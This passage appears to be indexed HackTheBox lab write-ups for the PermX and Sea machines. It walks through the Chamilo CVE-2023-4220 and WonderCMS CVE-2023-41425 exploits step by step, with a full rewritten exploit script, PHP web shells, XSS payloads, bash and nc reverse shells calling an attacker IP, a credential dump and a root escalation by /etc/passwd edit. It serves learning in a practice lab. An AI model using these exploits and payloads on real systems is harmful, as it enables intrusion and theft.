Duration: 1423ms]\n:: Progress: [114441/114441] :: Job [1/1] :: 1307 req/sec :: Duration: [0:01:14] :: Errors: 0 ::\n</code></pre> <p>We successfully discover two interesting subdomains, so we will add <code>www.permx.htb</code> as well as <code>lms.permx.htb</code> to our <code>/etc/hosts</code> file.</p> <p>Upon browsing to <code>http://www.permx.htb</code> we get greeted with the same site as <code>http://permx.htb</code>.</p> <p></p> <p>Next we browser to <code>http://lms.permx.htb</code>.</p> <p></p> <p>We can see an instance of the <code>Chamilo</code> LMS in use. To fingerprint the version in order to look for possible exploits we <code>curl</code> the <code>README.md</code>, which is accessible on the webpage.</p> <pre><code>$ curl -s http://lms.permx.htb/README.md | grep -i chamilo\n# Chamilo 1.11.x                   \n![PHP Composer](https://github.com/chamilo/chamilo-lms/workflows/PHP%20Composer/badge.svg?branch=1.11.x)\n[![Scrutinizer Code Quality](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/badges/quality-score.png?b=1.11.x)](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/?branch=1.11.x)\n&lt;--SNIP--&gt;\n</code></pre> <p>So some version 1.11.x of <code>Chamilo</code> is being used. </p>"}, {"location": "Write-Ups/PermX/#exploitation", "title": "Exploitation", "text": "<p>Googling for exploits for these versions we come across CVE-2023-4220 with PoC scripts available on <code>GitHub</code> as well.</p> <p>The exploit stems from an unauthenticated file upload vulnerability in <code>bigUpload.php</code> and can be exploited in versions &lt;= 1.11.24.</p> <p>In the following we will use this script to exploit the vulnerability. Reading through the usage examples on the <code>GitHub</code> page, we specify our <code>-u</code> target URL and the <code>-a</code> action to perform for which we chose the <code>scan</code> option in order to quickly be able to confirm the possible vulnerability.</p> <pre><code>$ python3 main.py -u http://lms.permx.htb -a scan\n[+] Target is likely vulnerable. Go ahead. [+]\n</code></pre> <p>With the vulnerability potentially confirmed, we will specify the <code>-a</code> action <code>webshell</code> to upload a web shell and gain command execution.</p> <pre><code>$ python3 main.py -u http://lms.permx.htb -a webshell\nEnter the name of the webshell file that will be placed on the target server (default: webshell.php): shelly.php\n\n[+] Upload successfull [+]\n\nWebshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php?cmd=&lt;command&gt;\n</code></pre> <p>Using <code>curl</code> on the provided URL by the script, we can confirm successful command execution using the <code>id</code> command.</p> <pre><code>$ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>We will establish a reverse shell connection now. So first start our listener.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\n</code></pre> <p>And run the <code>curl</code> command with a simple <code>bash</code> reverse shell command.</p> <pre><code>$ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.21/7777 0&gt;&amp;1'\"\n</code></pre> <p>Getting the reverse shell connection established successfully.</p> <pre><code>connect to [10.10.16.21] from (UNKNOWN) [10.129.71.63] 45426\nbash: cannot set terminal process group (1151): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ hostname\npermx\n</code></pre>"}, {"location": "Write-Ups/PermX/#host-enumeration", "title": "Host Enumeration", "text": "<p>Upon getting our reverse shell connection on the target host, we first start by doing some manual enumeration on the web roots of <code>/var/www/html</code> and <code>/var/www/chamilo</code> and look for config files. Nothing of great interest is to be found for <code>/var/www/html</code>, however we come across <code>/var/www/chamilo/cli-config.php</code>, which references database credentials.</p> <p>It also reveals another configuration file under <code>./app/config/configuration.php</code>.</p> <pre><code>$ cat cli-config.php\ncat cli-config.php\n&lt;?php\n/* For licensing terms, see /license.txt */\n\n/**\n * Script needed to execute bin/doctrine.php in the command line\n * in order to:.\n *\n * - Generate migrations\n * - Create schema\n * - Update schema\n * - Validate schema\n * - Etc\n */\nuse Doctrine\\ORM\\Tools\\Console\\ConsoleRunner;\n\nrequire_once __DIR__.'/vendor/autoload.php';\n//require_once __DIR__.'/main/inc/lib/api.lib.php';\n$configurationFile = __DIR__.'/app/config/configuration.php';\n\nif (!is_file($configurationFile)) {\n    echo \"File does not exists: $configurationFile\";\n    exit();\n}\n\nrequire_once __DIR__.'/main/inc/global.inc.php';\nrequire_once $configurationFile;\n\n$database = new \\Database();\n$dbParams = [\n    'driver' =&gt; 'pdo_mysql',\n    'host' =&gt; $_configuration['db_host'],\n    'user' =&gt; $_configuration['db_user'],\n    'password' =&gt; $_configuration['db_password'],\n    'dbname' =&gt; $_configuration['main_database'],\n];\n\n$database-&gt;connect($dbParams, realpath(__DIR__).'/', realpath(__DIR__).'/');\n$entityManager = $database::getManager();\n\n$helperSet = ConsoleRunner::createHelperSet($entityManager);\n$dialogHelper = new Symfony\\Component\\Console\\Helper\\QuestionHelper();\n$helperSet-&gt;set($dialogHelper);\n\nreturn $helperSet;\n</code></pre> <p>Taking a look at <code>./app/config/configuration.php</code> and \"grepping\" the variable names mentioned in the above file, we can get the values for <code>db_user</code> as well as <code>db_password</code>.</p> <pre><code>$ cat app/config/configuration.php | grep db_user\n$_configuration['db_user'] = 'chamilo';\n\n$ cat app/config/configuration.php | grep db_password\n$_configuration['db_password'] = '03F6lY3uXAP2bkW8';\n</code></pre> <p>We could also see from the <code>/var/www/chamilo/cli-config.php</code> file that MySQL was being used. So we can try to login using <code>mysql</code>, which is successful.</p> <pre><code>$ mysql -u chamilo -p03F6lY3uXAP2bkW8\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 54\nServer version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]&gt; show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| chamilo            |\n| information_schema |\n+--------------------+\n2 rows in set (0.001 sec)\n</code></pre> <p>We will use the <code>chamilo</code> database and show the tables present in it.</p> <pre><code>MariaDB [(none)]&gt; use chamilo\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A                                                                       \n\nDatabase changed\nMariaDB [chamilo]&gt; show tables;\n&lt;--SNIP--&gt;\n| user                                |\n| user_api_key                        |\n| user_course_category                |\n| user_friend_relation_type           |\n&lt;--SNIP--&gt;\n</code></pre> <p>Discovering the table <code>user</code> which sounds promising. We run the <code>describe user;</code> command to get the column names of the <code>user</code> table and then select the interesting information for us.</p> <pre><code>MariaDB [chamilo]&gt; select username,password from user;\nselect username,password from user;\n+----------+--------------------------------------------------------------+\n| username | password                                                     |\n+----------+--------------------------------------------------------------+\n| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |\n| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |\n+----------+--------------------------------------------------------------+\n2 rows in set (0.000 sec)\n</code></pre> <p>This appears to be in <code>Bcrypt</code> hash format and we can try to run <code>Hashcat</code> on it.</p> <pre><code>$ ./hashcat hashes/permx/mysql.hashes rockyou.txt -m 3200\n&lt;--SNIP--&gt;\n$2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS:anon\n&lt;--SNIP--&gt;\n</code></pre> <p>This proves to be unsuccessful other than revealing the <code>anon</code> password, which does not get us any further when trying for password reuse.</p> <p>Our next step would be to try for password reuse using the <code>db_password</code> value we obtained through the previously inspected files. For this we first enumerate the users on the target host.</p> <pre><code>$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\nmtz:x:1000:1000:mtz:/home/mtz:/bin/bash\n</code></pre> <p>And we see one user named <code>mtz</code> other than the <code>root</code> user. Trying to login as this user, using the <code>db_password</code> \"03F6lY3uXAP2bkW8\" we successfully authenticate.</p> <pre><code>$ su -l mtz\nPassword: 03F6lY3uXAP2bkW8\n\nmtz@permx:~$ id\nuid=1000(mtz) gid=1000(mtz) groups=1000(mtz)\n</code></pre> <p>Once authenticated, the user flag can be found in the home directory of user <code>mtz</code>.</p> <pre><code>$ cat user.txt\n74694b6b4527daac6ac1e3b761b0a3bd\n</code></pre>"}, {"location": "Write-Ups/PermX/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>We can run <code>sudo -l</code> to reveal commands we can run with <code>sudo</code> privileges as user <code>mtz</code>.</p> <pre><code>$ sudo -l\nMatching Defaults entries for mtz on permx:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser mtz may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /opt/acl.sh\n</code></pre> <p>Taking a look at the <code>acl.sh</code> script, it reveals that we can run the <code>setfacl</code> binary as root.</p> <pre><code>$ cat /opt/acl.sh\n#!/bin/bash\n\nif [ \"$#\" -ne 3 ]; then\n    /usr/bin/echo \"Usage: $0 user perm file\"\n    exit 1\nfi\n\nuser=\"$1\"\nperm=\"$2\"\ntarget=\"$3\"\n\nif [[ \"$target\" != /home/mtz/* || \"$target\" == *..* ]]; then\n    /usr/bin/echo \"Access denied.\"\n    exit 1\nfi\n\n# Check if the path is a file\nif [ ! -f \"$target\" ]; then\n    /usr/bin/echo \"Target must be a file.\"\n    exit 1\nfi\n\n/usr/bin/sudo /usr/bin/setfacl -m u:\"$user\":\"$perm\" \"$target\"\n</code></pre> <p>After getting a grasp on what the script does and expects as input, we can go to GTFOBins to look for ways we can possibly escalate our privileges through the <code>setfacl</code> binary the script uses.</p> <p>Under the <code>Sudo</code> section, we can see a possible way to escalate our privileges using this binary and we see this is basically the command the <code>acl.sh</code> script runs too. Now we just need to find a file we can abuse.</p> <p>Furthermore the <code>acl.sh</code> script restricts us to files inside our home directory, however we can bypass this restriction by creating a symbolic link to any file on the file system at our home directory.</p> <p>To finally escalate our privileges, we can do it several ways. One of the simpler ways is to either change the second entry for the <code>root</code> user from <code>x</code> in the <code>/etc/passwd</code> file to empty, meaning no password required to login as <code>root</code>. We could also choose to put the same hash as the <code>mtz</code> user in the <code>/etc/shadow</code> file for the <code>root</code> user, resulting in us being able to login as <code>root</code> using <code>mtz</code> password. In the following we will go with the former approach.</p> <p>We start by creating a symbolic link to the <code>/etc/passwd</code> file into our <code>mtz</code> home directory.</p> <pre><code>$ ln -s /etc/passwd passwd\n$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&lt;--SNIP--&gt;\n</code></pre> <p>We change the permissions to <code>rwx</code> for <code>mtz</code> by abusing the <code>acl.sh</code> script.</p> <pre><code>$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd\n</code></pre> <p>Next we run the following to clear the <code>x</code> in the second entry of the <code>/etc/passwd</code> file.</p> <pre><code>$ echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\n$ cat /etc/passwd\nroot::0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&lt;--SNIP--&gt;\n</code></pre> <p>We can confirm that the second entry has been cleared and we can now login as the <code>root</code> user without a password prompt.</p> <pre><code>$ su\n\nroot@permx:/home/mtz# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>The root flag can be found at <code>/root/root.txt</code>.</p> <pre><code># cat root.txt\n78af4a8f5cbed952d6bcd30bf158f280\n</code></pre>"}, {"location": "Write-Ups/PermX/#resources", "title": "Resources", "text": "<ul> <li>Cool way to fingerprint versions when having access to GitHub source code by ippsec.</li> </ul>"}, {"location": "Write-Ups/Sea/", "title": "Sea", "text": ""}, {"location": "Write-Ups/Sea/#initial-enumeration", "title": "Initial Enumeration", "text": "<p>We start with Nmap to discover open ports and services on the target host. First with the <code>-p-</code> and <code>--min-rate 10000</code> flags to potentially get all open TCP ports. Nmap will tell us 22 and 80 as being open. We run a detailed scan for these ports, doing version scanning and a script scan as well.</p> <pre><code>$ sudo nmap -p22,80 -sC -sV -vv -oN nmap-full 10.129.76.181\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 15:33 CET\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=\n|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=\n|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Sea - Home\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>TTL of 63 indicating a Linux host as well as possibly no containerization in play.</li> <li>22/TCP SSH: Running SSH on Ubuntu</li> <li>80/TCP HTTP: Apache web server version 2.4.41</li> </ul>"}, {"location": "Write-Ups/Sea/#port-80", "title": "Port 80", "text": "<p>Navigating to the web page first to get an overview.</p> <p><code>http://10.129.76.181</code> </p> <p>We browse through it, clicking on <code>HOW TO PARTICIPATE</code> and we can click on the <code>contact</code> hyperlink which redirects us to <code>http://sea.htb/contact.php</code> </p> <p></p> <p>We add <code>sea.htb</code> to our <code>/etc/hosts</code> file and visit the redirected page again.</p>"}, {"location": "Write-Ups/Sea/#contactphp", "title": "/contact.php", "text": "<p>We can fill out the form and specify our own attack machine IP (<code>http://&lt;ATTACK-IP&gt;/test</code>) in the <code>Website</code> field. Doing so, we will get a response on our listener, which reveals the <code>User-Agent</code> used. From the <code>User-Agent</code> we can see this as being a normal browser, which might indicate that some user clicked on the <code>Website</code> link we provided in the form.</p> <pre><code>$ nc -lvnp 80             \nlistening on [any] 80 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.76.181] 39424\nGET /test HTTP/1.1\nHost: 10.10.16.25\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\n</code></pre>"}, {"location": "Write-Ups/Sea/#curling-for-directories", "title": "Curling for directories", "text": "<p>We can use curl to obtain possible redirects to other resources. Alternatively we can run the <code>Ffuf</code> tool to fuzz for directories recursively, which should find the <code>themes</code> directory as well as the subdirectory <code>bike</code> as well.</p> <pre><code>$ curl -s http://sea.htb | grep -i sea.htb\n        &lt;link rel=\"stylesheet\" href=\"http://sea.htb/themes/bike/css/style.css\"&gt;\n                        &lt;center&gt;&lt;img src=\"http://sea.htb/themes/bike/img/velik71-new-logotip.png\" alt=\"\" /&gt;&lt;/center&gt;\n                                        &lt;a href=\"http://sea.htb/\"&gt;&lt;h1&gt;Sea&lt;/h1&gt;&lt;/a&gt;\n                                                &lt;a class=\"nav-link\" href=\"http://sea.htb/home\"&gt;Home&lt;/a&gt;&lt;/li&gt;&lt;li class=\"nav-item \"&gt;\n                                                &lt;a class=\"nav-link\" href=\"http://sea.htb/how-to-participate\"&gt;How to participate&lt;/a&gt;&lt;/li&gt;\n</code></pre> <p>Successfully discover <code>http://sea.htb/themes/bike</code>.</p> <p></p>"}, {"location": "Write-Ups/Sea/#fuzzing-themesbike", "title": "Fuzzing /themes/bike", "text": "<p>We will use <code>Ffuf</code> to fuzz for some files/directories on <code>/themes/bike</code>.</p> <pre><code>$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ic\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://sea.htb/themes/bike/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n.html                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 36ms]\n.htm                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 88ms]\nimg                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 96ms]\nLICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 69ms]\n404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 74ms]\nhome                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 162ms]\n.                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 103ms]\ncss                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 3930ms]\n.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 216ms]\n.php                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 4966ms]\n.phtml                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 290ms]\n.htc                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 145ms]\nversion                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 110ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>Interesting hits here are <code>LICENSE</code> and <code>version</code>.</p> <p>We visit <code>LICENSE</code> first.</p> <p><code>http://sea.htb/themes/bike/LICENSE</code> </p> <p>We can see <code>turboblack</code> and googling \"turboblack bike theme\" reveals a theme creator for <code>WonderCMS</code>.</p> <p></p> <p>When visiting <code>http://sea.htb/themes/bike/version</code>, we can see a version in use.</p> <p></p> <p>We can assume here that <code>WonderCMS</code> is being used and running on version 3.2.0.</p>"}, {"location": "Write-Ups/Sea/#exploitation", "title": "Exploitation", "text": "<p>Wonder CMS version v3.2.0 through v3.4.2 is vulnerable to a reflected XSS and publicly available PoC code exists. It is possible to chain this XSS vulnerability to an RCE, by further abusing the <code>installModule</code> component to install a malicious theme.</p> <p>Info</p> <p>In the following are two ways to achieve successful remote code execution, by using the proof-of-concept script as well as by writing our own Python script.</p> Proof-of-Concept RCEOwn RCE <p>We run the exploit specifying our attacking IP and port we listen on as well as the target URL (adjusting the PoC to our scenario). This generates our <code>xss.js</code> file and we then copy the link displayed.</p> <p>First we will create our payload. The PoC itself tries to download a PHP reverse shell, however <code>HackTheBox</code> machines have no internet connection, so we need to specify and host our own. We could decide to straight up go with a PHP reverse shell (like <code>pentestmonkey</code>), but I will go the safe route by choosing a simple PHP web shell.</p> <pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre> <p>We put the payload in a file and call it <code>shelly.php</code>.</p> <pre><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shelly.php\n</code></pre> <p>Next we create a folder and move our malicious PHP file into it, which is needed to successfully install the module.</p> <pre><code>mkdir shelly &amp;&amp; mv shelly.php shelly/\n</code></pre> <p>Lastly for our payload we zip it up.</p> <pre><code>zip shelly.zip shelly/ -r\n</code></pre> <p>Next we can move on to modify the PoC script.</p> <p>To adjust the target URL we mirror the PoC <code>URL</code> to check if we get the login prompt, which we successfully do at:</p> <p><code>http://sea.htb/index.php?page=loginURL</code> </p> <p>Next we adjust the PoC Python script, we need to change some code, namely the <code>data</code> variable which contains the code for the malicious <code>xss.js</code>:</p> <pre><code>&lt;--SNIP--&gt;\nelse:\ndata = '''\nvar url = \"'''+str(sys.argv[1])+'''\";\nif (url.endsWith(\"/\")) {\nurl = url.slice(0, -1);\n}\nvar urlWithoutLog = url.split(\"/\").slice(0, -1).join(\"/\");\nvar urlWithoutLogBase = new URL(urlWithoutLog).pathname; \nvar token = document.querySelectorAll('[name=\"token\"]')[0].value;\nvar urlRev = \"http://sea.htb/?installModule=http://10.10.16.25:8000/shelly.zip&amp;directoryName=violet&amp;type=themes&amp;token=\" + token;\nvar xhr3 = new XMLHttpRequest();\nxhr3.withCredentials = true;\nxhr3.open(\"GET\", urlRev);\nxhr3.send();\n'''\n&lt;--SNIP--&gt;\n</code></pre> <ul> <li>We change the <code>urlRev</code> variable to install a module that is hosted on our attack host. We also specify <code>http://sea.htb</code> instead of the variables the PoC uses, since it is a bit unstable in working otherwise.</li> <li>Since we do not launch a reverse shell, we can just delete everything after the <code>xhr3.send()</code> function call.</li> </ul> <p>If you do decide to go the direct reverse shell route, make sure to also change the <code>xhr4.open(\"GET\", \"http://sea.htb/themes/shelly/shelly.php\");</code> as well as the <code>xhr5.open(\"GET\", \"http://sea.htb/themes/shelly/shelly.php?lhost=\" + ip + \"&amp;lport=\" + port);</code></p> <p>Now we can actually run it to generate the <code>xss.js</code> file, start the web server and to get our XSS payload.</p> <pre><code>$ python3 exploit.py http://sea.htb/loginURL 10.10.16.25 7777\n[+] xss.js is created\n[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp 7777\n----------------------------\n\nsend the below link to admin:\n\n----------------------------\nhttp://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"\n----------------------------\n\n\nstarting HTTP server to allow the access to xss.js\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n</code></pre> <p>The only thing left now is to trigger the XSS payload.</p> <p>During our previous enumeration on <code>/contact.php</code>, we know someone is visiting the URL we provide in the <code>Website</code> field of the contact form. We choose this to place our reflected XSS payload (<code>http://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"</code>).</p> <p></p> <p>After some time we get a hit on the web server the exploit has started: <pre><code>&lt;--SNIP--&gt;\nstarting HTTP server to allow the access to xss.js\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.129.194.205 - - [21/Nov/2024 14:50:25] \"GET /xss.js HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:35] \"GET /shelly.zip HTTP/1.1\" 200 -\n</code></pre></p> <p>Next we can access the uploaded web shell using curl on <code>http://sea.htb/themes/shelly/shelly.php</code>.</p> <pre><code>$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=hostname'\nsea\n</code></pre> <p>We can now also get a reverse shell by choosing any Linux binary that is able to do so and issue it using our web shell. I'm choosing <code>nc</code> here.</p> <pre><code>$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=which+nc'\n/usr/bin/nc\n\n$ curl -s 'http://sea.htb/themes/shelly/shelly.php' --get --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.25 7777 &gt;/tmp/f\"\n</code></pre> <p>Before we run the above command, we of course set up our listener. Then after running the command we successfully catch the reverse shell connection on our listener as <code>www-data</code> user:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 39684\nbash: cannot set terminal process group (1135): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@sea:/var/www/sea/themes/shelly$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@sea:/var/www/sea/themes/shelly$ hostname\nsea\n</code></pre> <p>I decided to rewrite the <code>PoC</code> script a bit, allowing to adjust the web server IP and port as well as simplifying the payload to a simple PHP web shell that is generated by the script itself. The script also provides the web shell location in order to execute commands and provides an example command for Linux in order to get a reverse shell connection.</p> <p>The script can also be found on my GitHub.</p> exploit.py<pre><code>import requests\nimport argparse\nfrom argparse import RawTextHelpFormatter\nimport os\nimport subprocess\nimport zipfile\nfrom termcolor import colored\n\ndef main():\nparser = argparse.ArgumentParser(description=\"Exploit Wonder CMS v3.2.0 - v3.4.2 XSS to RCE (CVE-2023-41425)\\nInitial CVE and proof-of-concept by prodigiousMind\\nRewritten by xpltive\", formatter_class=RawTextHelpFormatter)\nparser.add_argument(\"--url\", required=True, help=\"Target URL of loginURL (Example: http://sea.htb/loginURL)\")\nparser.add_argument(\"--xip\", required=True, help=\"IP for HTTP web server that hosts the malicious .js file\")\nparser.add_argument(\"--xport\", required=True, help=\"Port for HTTP web server that hosts the malicious .js file\")\nargs = parser.parse_args()\n\ntarget_login_url = args.url\ntarget_split = args.url.split('/')\ntarget_url = target_split[0] +  '//' + target_split[2]\n\n# Web Shell\nprint(\"[+] Creating PHP Web Shell\")\nif not os.path.exists('malicious'):\n        os.mkdir('malicious')\n        with open ('malicious/malicious.php', 'w') as f:\n        f.write('&lt;?php system($_GET[\"cmd\"]); ?&gt;')\n        with zipfile.ZipFile('./malicious.zip', 'w') as z:\n        z.write('malicious/malicious.php')\n        os.remove('malicious/malicious.php')\n        os.rmdir('malicious')\nelse:\n        print(colored(\"[!] Directory malicious already exists!\", 'yellow'))\n\n# Malicious .js\njs = f'''var token = document.querySelectorAll('[name=\"token\"]')[0].value;\nvar module_url = \"{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&amp;directoryName=pwned&amp;type=themes&amp;token=\" + token;\nvar xhr = new XMLHttpRequest();\nxhr.withCredentials = true;\nxhr.open(\"GET\", module_url);\nxhr.send();'''\n\nprint(\"[+] Writing malicious.js\")\nwith open('malicious.js', 'w') as f:\n        f.write(js)\n\n\nxss_payload = args.url.replace(\"loginURL\", \"index.php?page=loginURL?\")+\"\\\"&gt;&lt;/form&gt;&lt;script+src=\\\"http://\"+args.xip+\":\"+args.xport+\"/malicious.js\\\"&gt;&lt;/script&gt;&lt;form+action=\\\"\"\nprint(\"[+] XSS Payload:\")\nprint(colored(f\"{xss_payload}\", 'red'))\n\nprint(\"[+] Web Shell can be accessed once .zip file has been requested:\")\nprint(colored(f\"{target_url}/themes/malicious/malicious.php?cmd=&lt;COMMAND&gt;\", 'red'))\nprint(\"[+] To get a reverse shell connection run the following:\")\nprint(colored(f\"curl -s '{target_url}/themes/malicious/malicious.php' --get --data-urlencode \\\"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\\\" \", 'yellow'))\n\nprint(\"[+] Starting HTTP server\")\nsubprocess.run([\"python3\", \"-m\", \"http.server\", \"-b\", args.xip, args.xport])\n\nif __name__ == \"__main__\":\nmain()\n</code></pre> <p>For exploitation, we follow some of the same steps as with the proof-of-concept RCE tab.</p> <p>First we validate that the <code>loginURL</code> can be accessed via <code>http://sea.htb/loginURL</code>, which is successful. </p> <p>With having the 